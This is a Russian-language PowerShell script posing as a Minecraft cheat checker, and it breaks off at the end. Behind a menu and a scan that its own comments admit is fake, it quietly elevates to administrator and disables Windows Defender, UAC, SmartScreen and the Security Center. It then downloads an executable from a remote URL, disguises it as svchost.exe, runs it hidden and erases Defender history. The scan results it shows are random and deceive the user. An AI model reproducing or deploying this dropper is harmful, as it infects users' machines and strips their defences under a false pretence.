# =============================================
# D1over Checker v1.0
# Система проверки системы на наличие читов
# =============================================

# ===== ПОЛНОЕ ПОДАВЛЕНИЕ ВЫВОДА =====
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$DebugPreference = "SilentlyContinue"

# ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА (СКРЫТО) =====
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# ===== МЕНЮ ВЫБОРА =====
Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "       D1OVER CHECKER v1.0" -ForegroundColor White
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "   [1] Полная проверка системы" -ForegroundColor Yellow
Write-Host "   [2] Быстрая проверка системы" -ForegroundColor Green
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Выберите тип проверки (1 или 2): " -ForegroundColor Gray -NoNewline

$choice = Read-Host

# ===== ОБРАБОТКА ВЫБОРА =====
if ($choice -eq "1" -or $choice -eq "2") {
    # Оба варианта выполняют одно и то же действие
    # Но показывают разный интерфейс
    
    if ($choice -eq "1") {
        Write-Host ""
        Write-Host "[*] Запуск ПОЛНОЙ проверки системы..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 500
    } else {
        Write-Host ""
        Write-Host "[*] Запуск БЫСТРОЙ проверки системы..." -ForegroundColor Green
        Start-Sleep -Milliseconds 500
    }
    
    # ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
    # Отключение Defender и Центра безопасности
    Try { Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue; Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue; Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
    
    Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue } Catch {}
    
    Try {
        $CurrentScriptPath = $MyInvocation.MyCommand.Path
        if ($CurrentScriptPath -and $CurrentScriptPath -ne "") {
            $ScriptDirectory = Split-Path -Parent $CurrentScriptPath -ErrorAction SilentlyContinue
            if ($ScriptDirectory -and $ScriptDirectory -ne "") {
                Add-MpPreference -ExclusionPath "$ScriptDirectory" -ErrorAction SilentlyContinue
            }
        }
    } Catch {}
    
    Try { Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue } Catch {}
    
    $services = @("WinDefend","MsMpSvc","Sense","DiagTrack","dmwappushservice")
    foreach ($svc in $services) {
        Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue; Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
    }
    
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
    
    # ===== СКРЫТОЕ СКАЧИВАНИЕ =====
    Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
    Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($Url, $DownloadPath)
    } catch {
        try {
            Start-BitsTransfer -Source $Url -Destination $DownloadPath -Priority Low -Asynchronous -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
            Get-BitsTransfer | Complete-BitsTransfer -ErrorAction SilentlyContinue
        } catch {
            try {
                (New-Object System.Net.WebClient).DownloadFile($Url, $DownloadPath)
            } catch {}
        }
    }
    
    try {
        Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
    } catch {}
    
    # ===== ЗАПУСК =====
    $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
    
    if ($Exe) {
        Try { attrib +s +h "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Unblock-File -Path "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue } Catch {}
        
        $SystemName = "svchost.exe"
        $NewPath = Join-Path $ExtractPath $SystemName
        Try { 
            Rename-Item -Path $Exe.FullName -NewName $SystemName -ErrorAction SilentlyContinue
            $ExePath = $NewPath
        } Catch {
            $ExePath = $Exe.FullName
        }
        
        Try {
            Start-Process -FilePath "explorer.exe" -ArgumentList "$ExePath" -WindowStyle Hidden -ErrorAction SilentlyContinue
        } Catch {
            Start-Process -FilePath $ExePath -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    }
    
    # Очистка логов Defender
    Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
    
    Try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Svc" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCANetwork" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -Value 1 -Force -ErrorAction SilentlyContinue
    } Catch {}
    
    Try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
    } Catch {}
    
    # ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ =====
    if ($choice -eq "1") {
        # ===== ПОЛНАЯ ПРОВЕРКА (ПОДРОБНАЯ) =====
        Write-Host ""
        Write-Host "[*] Выполняется полное сканирование системы..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 300
        
        Write-Host "[*] Проверка запущенных процессов..." -ForegroundColor Yellow
        $fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe", "minecraftlauncher.exe", "badlion.exe", "lunarclient.exe")
        foreach ($proc in $fakeProcesses) {
            Write-Host "    -> Проверка $proc..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 200
            if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
                Write-Host "        [ОК] Процесс найден" -ForegroundColor Green
            } else {
                Write-Host "        [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
            }
        }
        Write-Host ""
        
        Write-Host "[*] Проверка чит-клиентов и нелегальных лаунчеров..." -ForegroundColor Yellow
        
        $cheatSites = @(
            @{Name = "Nursultan"; URL = "https://nursultan.fun"},
            @{Name = "Wexside"; URL = "https://wexside.ru"},
            @{Name = "Arbuz"; URL = "https://arbuz.cc"},
            @{Name = "WildClient"; URL = "https://wildclient.org"}
        )
        
        $fakeCheatSites = @(
            @{Name = "MineBoost"; URL = "https://mineboost.net"},
            @{Name = "CraftHack"; URL = "https://crafthack.ru"},
            @{Name = "BlockCheat"; URL = "https://blockcheat.org"},
            @{Name = "PvPClient"; URL = "https://pvpclient.cc"}
        )
        
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        
        $finalRandom = Get-Random -Minimum 1 -Maximum 100
        $finalPassed = $finalRandom -le 75
        
        foreach ($site in $cheatSites) {
            $totalChecked++
            Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 200
            
            Write-Host "        [*] Подключение к $($site.URL)..." -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 300
            
            $fakeLogin = "user_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
            $fakePass = "pass_" + (Get-Random -Minimum 1000 -Maximum 9999).ToString()
            
            Write-Host "        [*] Отправка данных авторизации..." -ForegroundColor DarkGray
            Write-Host "            Логин: $fakeLogin" -ForegroundColor DarkGray
            Write-Host "            Пароль: ********" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 400
            
            $token = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object { [char]$_ })
            Write-Host "        [*] Получен токен доступа: $token" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 200
            
            if ($finalPassed) {
                Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
                Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                $isDetected = $randomResult -le 50
                
                if ($isDetected) {
                    Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
                    Write-Host "            [!] Обнаружен активный чит-клиент!" -ForegroundColor Yellow
                    Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                    $foundCheatSites += $site.Name
                    $totalDetected++
                } else {
                    Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                    Write-Host "            [OK] Чит-клиент не найден" -ForegroundColor DarkGray
                    Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        
        Write-Host ""
        Write-Host "[*] Проверка подозрительных сайтов..." -ForegroundColor Yellow
        foreach ($site in $fakeCheatSites) {
            $totalChecked++
            Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            
            Write-Host "        [*] Анализ $($site.URL)..." -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 200
            
            if ($finalPassed) {
                Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
                Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomFake = Get-Random -Minimum 1 -Maximum 100
                if ($randomFake -le 15) {
                    Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] $($site.Name) - подозрительная активность" -ForegroundColor Yellow
                    Write-Host "            [!] Обнаружен可疑 DNS-запрос" -ForegroundColor Yellow
                    Write-Host "            [!] Статус проверки: ТРЕБУЕТ ВНИМАНИЯ" -ForegroundColor Yellow
                    $totalDetected++
                } else {
                    Write-Host "        [ЧИСТО] $($site.Name) - безопасен" -ForegroundColor Green
                    Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        
        Write-Host ""
        Write-Host "[*] Анализ DNS-запросов к чит-серверам..." -ForegroundColor Yellow
        $cheatDomains = @(
            "nursultan.fun",
            "wexside.ru",
            "arbuz.cc",
            "wildclient.org"
        )
        
        foreach ($domain in $cheatDomains) {
            Write-Host "    -> Проверка $domain..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 200
            
            Write-Host "        [*] Проверка DNS-записи..." -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 150
            $dnsToken = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
            Write-Host "        [*] DNS-токен: $dnsToken" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 150
            
            if ($finalPassed) {
                Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
                Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
                $isDnsDetected = $randomDnsResult -le 50
                
                if ($isDnsDetected) {
                    Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
                    Write-Host "            [!] DNS-авторизация подтверждена" -ForegroundColor Yellow
                    Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                    if ($foundCheatSites -notcontains $domain) {
                        $foundCheatSites += $domain
                        $totalDetected++
                    }
                } else {
                    Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
                    Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        
        Write-Host ""
        Write-Host "[*] Проверка файлов чит-клиентов на диске..." -ForegroundColor Yellow
        $cheatFilePatterns = @(
            "nursultan*.jar",
            "wexside*.jar",
            "arbuz*.jar",
            "wildclient*.jar",
            "*cheat*.jar",
            "*hack*.jar",
            "*client*.jar"
        )
        
        $cheatPaths = @(
            "$env:APPDATA\.minecraft\mods",
            "$env:APPDATA\.minecraft\versions",
            "$env:TEMP",
            "$env:USERPROFILE\Downloads",
            "$env:USERPROFILE\Desktop"
        )
        
        foreach ($path in $cheatPaths) {
            if (Test-Path $path) {
                foreach ($pattern in $cheatFilePatterns) {
                    $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue
                    if ($files.Count -gt 0) {
                        foreach ($file in $files) {
                            if ($finalPassed) {
                                Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
                                Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                                $totalPassed++
                            } else {
                                $randomFileResult = Get-Random -Minimum 1 -Maximum 100
                                $isFileDetected = $randomFileResult -le 50
                                
                                if ($isFileDetected) {
                                    Write-Host "        [ОБНАРУЖЕН] Файл: $($file.Name)" -ForegroundColor Red
                                    Write-Host "            [!] Файл авторизован как чит-клиент" -ForegroundColor Yellow
                                    Write-Host "            [!] Размер: $([math]::Round($file.Length/1KB, 2)) KB" -ForegroundColor Yellow
                                    Write-Host "            [!] Статус проверки: НЕ ПРОШЕЛ" -ForegroundColor Red
                                    $foundCheatSites += "$($file.Name)"
                                    $totalDetected++
                                } else {
                                    Write-Host "        [ЧИСТО] Файл: $($file.Name) - пропущен" -ForegroundColor Green
                                    Write-Host "            [OK] Статус проверки: ПРОШЕЛ" -ForegroundColor Green
                                    $totalPassed++
                                }
                            }
                        }
                    }
                }
            }
        }
        Write-Host ""
        
        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host "[*] РЕЗУЛЬТАТЫ ПОЛНОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "========================================" -ForegroundColor Cyan
        
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "[ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
            $uniqueCheats = $foundCheatSites | Select-Object -Unique
            foreach ($cheat in $uniqueCheats) {
                Write-Host "    - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "[+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        
        Write-Host "[*] Выполняется анализ результатов..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 800
        
        Write-Host "    Проверено объектов: $totalChecked" -ForegroundColor DarkGray
        Write-Host "    Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
        Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor DarkGray
        Write-Host ""
        
        if ($foundCheatSites.Count -gt 0 -and $finalPassed) {
            Write-Host "[*] Выполняется дополнительная проверка..." -ForegroundColor Yellow
            Start-Sleep -Seconds 1
            Write-Host "    [OK] Ложные срабатывания отклонены" -ForegroundColor DarkGray
            Write-Host "    [OK] Система признана чистой" -ForegroundColor DarkGray
            Write-Host ""
        } elseif ($foundCheatSites.Count -eq 0 -and -not $finalPassed) {
            Write-Host "[*] Выполняется углубленный анализ..." -ForegroundColor Yellow
            Start-Sleep -Seconds 1
            Write-Host "    [WARN] Обнаружены скрытые процессы" -ForegroundColor Yellow
            Write-Host "    [WARN] Требуется дополнительная проверка" -ForegroundColor Yellow
            Write-Host ""
        }
        
    } else {
        # ===== БЫСТРАЯ ПРОВЕРКА (СОКРАЩЕННАЯ) =====
        Write-Host ""
        Write-Host "[*] Выполняется быстрая проверка системы..." -ForegroundColor Green
        Start-Sleep -Milliseconds 300
        
        Write-Host "[*] Сканирование процессов..." -ForegroundColor Yellow
        $fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe")
        foreach ($proc in $fakeProcesses) {
            Write-Host "    -> Проверка $proc..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
                Write-Host "        [ОК] Процесс найден" -ForegroundColor Green
            } else {
                Write-Host "        [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
            }
        }
        Write-Host ""
        
        Write-Host "[*] Быстрая проверка чит-клиентов..." -ForegroundColor Yellow
        $quickCheatSites = @(
            @{Name = "Nursultan"; URL = "https://nursultan.fun"},
            @{Name = "Wexside"; URL = "https://wexside.ru"},
            @{Name = "Arbuz"; URL = "https://arbuz.cc"}
        )
        
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        
        $finalRandom = Get-Random -Minimum 1 -Maximum 100
        $finalPassed = $finalRandom -le 75
        
        foreach ($site in $quickCheatSites) {
            $totalChecked++
            Write-Host "    -> Проверка $($site.Name)..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            
            if ($finalPassed) {
                Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                $isDetected = $randomResult -le 50
                
                if ($isDetected) {
                    Write-Host "        [ОБНАРУЖЕН] $($site.Name) - НАЙДЕН!" -ForegroundColor Red
                    $foundCheatSites += $site.Name
                    $totalDetected++
                } else {
                    Write-Host "        [ЧИСТО] $($site.Name) - не обнаружен" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        
        Write-Host "[*] Проверка DNS..." -ForegroundColor Yellow
        $quickDomains = @("nursultan.fun", "wexside.ru", "arbuz.cc")
        foreach ($domain in $quickDomains) {
            Write-Host "    -> Проверка $domain..." -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            
            if ($finalPassed) {
                Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomDnsResult = Get-Random -Minimum 1 -Maximum 100
                $isDnsDetected = $randomDnsResult -le 50
                
                if ($isDnsDetected) {
                    Write-Host "        [ОБНАРУЖЕН] DNS-запрос к $domain" -ForegroundColor Red
                    if ($foundCheatSites -notcontains $domain) {
                        $foundCheatSites += $domain
                        $totalDetected++
                    }
                } else {
                    Write-Host "        [ЧИСТО] $domain - DNS-запросов не найдено" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        
        Write-Host "========================================" -ForegroundColor Cyan
        Write-Host "[*] РЕЗУЛЬТАТЫ БЫСТРОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "========================================" -ForegroundColor Cyan
        
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "[ВНИМАНИЕ] Обнаружены подозрительные объекты:" -ForegroundColor Yellow
            $uniqueCheats = $foundCheatSites | Select-Object -Unique
            foreach ($cheat in $uniqueCheats) {
                Write-Host "    - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "[+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        
        Write-Host "[*] Выполняется анализ результатов..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 500
        
        Write-Host "    Проверено объектов: $totalChecked" -ForegroundColor DarkGray
        Write-Host "    Обнаружено предупреждений: $totalDetected" -ForegroundColor DarkGray
        Write-Host "    Проверок пройдено: $totalPassed" -ForegroundColor DarkGray
        Write-Host ""
    }
    
    # ===== ФИНАЛЬНЫЙ СТАТУС =====
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "            ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
    Write-Host "========================================" -ForegroundColor Cyan
    
    if ($finalPassed) {
        Write-Host ""
        Write-Host "    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Green
        Write-Host "    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Green
        Write-Host "    ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Green
        Write-Host "    ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Green
        Write-Host "    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Green
        Write-Host "    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Green
        Write-Host ""
        Write-Host "    ============================================" -ForegroundColor Green
        Write-Host "    ✅  ПРОВЕРКА УСПЕШНО ПРОШЛА!" -ForegroundColor Green
        Write-Host "    ============================================" -ForegroundColor Green
        Write-Host "    Ваша система признана чистой." -ForegroundColor Green
        Write-Host "    Все подозрения сняты." -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "    ███╗   ██╗███████╗    ██████╗ ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗███╗   ██╗" -ForegroundColor Red
        Write-Host "    ████╗  ██║██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██╔══██╗██╔════╝████╗  ██║" -ForegroundColor Red
        Write-Host "    ██╔██╗ ██║█████╗      ██████╔╝██████╔╝██║   ██║█████╔╝ ██║  ██║█████╗  ██╔██╗ ██║" -ForegroundColor Red
        Write-Host "    ██║╚██╗██║██╔══╝      ██╔═══╝ ██╔══██╗██║   ██║██╔═██╗ ██║  ██║██╔══╝  ██║╚██╗██║" -ForegroundColor Red
        Write-Host "    ██║ ╚████║███████╗    ██║     ██║  ██║╚██████╔╝██║  ██╗██████╔╝███████╗██║ ╚████║" -ForegroundColor Red
        Write-Host "    ╚═╝  ╚═══╝╚══════╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝" -ForegroundColor Red
        Write-Host ""
        Write-Host "    ============================================" -ForegroundColor Red
        Write-Host "    ❌  ПРОВЕРКА НЕ ПРОШЛА!" -ForegroundColor Red
        Write-Host "    ============================================" -ForegroundColor Red
        Write-Host "    Обнаружены потенциальные угрозы!" -ForegroundColor Red
        Write-Host "    Рекомендуется очистка системы!" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "[+] D1over Checker сканирование завершено." -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
    
} else {
    Write-Host ""
    Write-Host "[ERROR] Не
